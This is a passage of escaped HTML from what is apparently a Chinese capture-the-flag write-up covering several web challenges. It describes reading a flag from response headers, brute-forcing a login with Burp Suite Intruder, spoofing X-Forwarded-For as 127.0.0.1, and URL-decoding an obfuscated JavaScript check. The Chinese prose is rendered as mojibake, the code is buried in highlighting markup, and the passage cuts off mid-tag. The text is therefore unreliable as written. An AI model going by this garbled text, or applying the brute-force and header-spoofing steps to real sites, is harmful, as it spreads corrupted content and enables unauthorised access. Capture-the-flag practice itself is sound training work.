id=\"å¤´ç­‰èˆ±\"\u003eå¤´ç­‰èˆ±\u003c/h2\u003e\n\u003cp\u003eæ‰“å¼€ç½‘é¡µæ˜¾ç¤ºä»€ä¹ˆéƒ½æ²¡æœ‰ï¼ŒæŸ¥çœ‹æºä»£ç ä¹Ÿä»€ä¹ˆéƒ½æ²¡æœ‰ï¼Œæ‰“å¼€æ§åˆ¶å°é‡æ–°åŠ è½½çœ‹å¤´æ–‡ä»¶ï¼Œä»€ä¹ˆä¹Ÿæ²¡æœ‰ï¼Œ\nç‚¹å‡»æ˜¾ç¤ºå¤´æ–‡ä»¶æºä»£ç ï¼Œæ˜¾ç¤ºflagï¼ˆæ³¨é‡Šå½¢å¼ï¼‰\u003c/p\u003e\n\u003ch2 id=\"ç½‘ç«™è¢«é»‘\"\u003eç½‘ç«™è¢«é»‘\u003c/h2\u003e\n\u003cp\u003eæ‰«æç«¯å£\u003c/p\u003e\n\u003cp\u003eå‘ç°ç™»é™†ç•Œé¢\u003c/p\u003e\n\u003cp\u003eç„¶åç”¨burpsuiteçš„intruderåŠŸèƒ½ç ´è§£\u003c/p\u003e\n\u003ch2 id=\"ç®¡ç†å‘˜ç³»ç»Ÿ\"\u003eç®¡ç†å‘˜ç³»ç»Ÿ\u003c/h2\u003e\n\u003cp\u003eå®åœ¨æ²¡æœ‰å¤´ç»ªï¼Œä¸Šç½‘æŸ¥è¯´è¿™æ˜¯X-Forwarded-For:ç®€ç§°XFFå¤´ï¼Œå®ƒä»£è¡¨å®¢æˆ·ç«¯ï¼Œ\nä¹Ÿå°±æ˜¯HTTPçš„è¯·æ±‚ç«¯çœŸå®çš„IPï¼Œåªæœ‰åœ¨é€šè¿‡äº†HTTP ä»£ç†æˆ–è€…è´Ÿè½½å‡è¡¡æœåŠ¡å™¨æ—¶æ‰ä¼šæ·»åŠ è¯¥é¡¹ã€‚\nä¹Ÿå°±æ˜¯ç¬¬ä¸€æ¬¡å‘é€çš„æ—¶å€™ä¼šè®°å½•æœ¬ä¸»æœºçš„ipï¼Œä¹‹åæ¯æ¬¡ç»è¿‡ä¸€ä¸ªä»£ç†ï¼Œ\néƒ½ä¼šåœ¨å°¾éƒ¨æ·»åŠ ä¸€ä¸ªä»£ç†çš„ipï¼Œ\nX-Forwarded-Forå¯ä»¥æ˜¾ç¤ºå®Œæ•´çš„ä¼ è¾“è·¯å¾„å’Œæ¶æ„æ”»å‡»æ¥æºä½†æ˜¯X-Forward-Forå¯ä»¥è¢«ä¼ªé€ ã€‚é¢˜ç›®ä¸­è¯´è”ç³»æœ¬åœ°ç®¡ç†å‘˜ï¼Œé‚£å°±è®¾ç½®X-Forwarded-Forä¸ºä»£è¡¨æœ¬åœ°è®¿é—®çš„127.0.0.1ã€‚\nåŒæ—¶æŸ¥çœ‹ç½‘é¡µæºä»£ç å‘ç°ï¼Œæœ‰ä¸€ä¸²æ³¨é‡Šï¼ŒæŸ¥åˆ°è¯´æ˜¯base64ç¼–ç ï¼Œ\nç‰¹å¾æ˜¯ç»“å°¾ä»¥ä¸€ä¸ªæˆ–è€…ä¸¤ä¸ª=ç»“æŸï¼Œè§£ç åå¾—åˆ°å¯†ç ï¼Œè¾“å…¥åä½¿ç”¨burpsuiteè¿›è¡Œæ‹¦æˆªï¼Œ\næ·»åŠ X-Forwarded-Forï¼š127ã€‚0.0.1åå‘é€ï¼Œå¾—åˆ°äº†flag\u003c/p\u003e\n\u003cp\u003eå‚è€ƒèµ„æ–™ï¼šctfä¸­å¸¸è§çš„ç¼–ç æ ¼å¼ï¼š \u003ca href=\"https://www.cnblogs.com/gwind/p/7997922.html\"\u003ehttps://www.cnblogs.com/gwind/p/7997922.html\u003c/a\u003e\u003c/p\u003e\n\u003ch2 id=\"web4\"\u003eweb4\u003c/h2\u003e\n\u003cp\u003eæŸ¥çœ‹æºä»£ç ï¼Œå‘ç°ä¸€ä¸²urlç¼–ç çš„ä¸œè¥¿ï¼Œ\nEvalå‡½æ•°ä¼šå°†é‡Œé¢çš„å†…å®¹ä½œä¸ºä»£ç æ‰§è¡Œï¼Œunescapeå°†å…¶è§£ç ã€‚è¦è§£ç ï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-python\" data-lang=\"python\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003eimport\u003c/span\u003e urllib\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ea \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e%66%\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e75\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e%6e%63%\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e74\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e%69%\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e6f\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e%6e%20%\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e63\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e%68%\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e65\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e%63%\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e6b\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e%53%\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e75\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e%62%\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e6d\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e%69%\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e74\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e28\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e29\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e7\u003c/span\u003eb\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e76\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e61\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e72\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e20\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e61\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e3\u003c/span\u003ed\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e64\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e6\u003c/span\u003ef\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e63\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e75\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e6\u003c/span\u003ed\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e65\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e6\u003c/span\u003ee\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e74\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e2\u003c/span\u003ee\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e67\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e65\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e74\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e45\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e6\u003c/span\u003ec\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e65\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e6\u003c/span\u003ed\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e65\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e6\u003c/span\u003ee\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e74\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e42\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e79\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e49\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e64\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e28\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e22\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e70\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e61\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e73\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e73\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e77\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e6\u003c/span\u003ef\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e72\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e64\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e22\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e29\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#ae81ff\"\u003e3\u003c/span\u003eb\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e69\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e66\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e28\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e22\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e75\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e6\u003c/span\u003ee\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e64\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e65\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e66\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e69\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e6\u003c/span\u003ee\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e65\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e64\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e22\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e21\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e3\u003c/span\u003ed\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e74\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e79\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e70\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e65\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e6\u003c/span\u003ef\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e66\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e20\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e61\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e29\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e7\u003c/span\u003eb\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e69\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e66\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e28\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e22\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e36\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e37\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e64\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e37\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e30\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e39\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e62\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e32\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e62\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eb \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e%61%\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e61\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e%36%\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e34\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e%38%\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e63\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e%66%\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e36\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e%65%\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e38\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e%37%\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e61\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e%37%\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e31\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e%31%\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e34\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e%66%\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e31\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e%22%\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e3d\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e3\u003c/span\u003ed\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e61\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e2\u003c/span\u003ee\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e76\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e61\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e6\u003c/span\u003ec\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e75\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e65\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e29\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e72\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e65\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e74\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e75\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e72\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e6\u003c/span\u003ee\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e21\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e30\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e3\u003c/span\u003eb\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e61\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e6\u003c/span\u003ec\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e65\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e72\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e74\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e28\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e22\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e45\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e72\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e72\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e6\u003c/span\u003ef\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e72\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e22\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e29\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e3\u003c/span\u003eb\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e61\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e2\u003c/span\u003ee\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e66\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e6\u003c/span\u003ef\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e63\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e75\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e73\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e28\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e29\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e3\u003c/span\u003eb\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e72\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e65\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e74\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e75\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e72\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e6\u003c/span\u003ee\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e21\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e31\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e7\u003c/span\u003ed\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e7\u003c/span\u003ed\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e64\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e6\u003c/span\u003ef\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e63\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e75\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e6\u003c/span\u003ed\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e65\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e6\u003c/span\u003ee\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e74\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e2\u003c/span\u003ee\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e67\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e65\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e74\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e45\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e6\u003c/span\u003ec\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e65\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e6\u003c/span\u003ed\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e65\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e6\u003c/span\u003ee\u003cspan 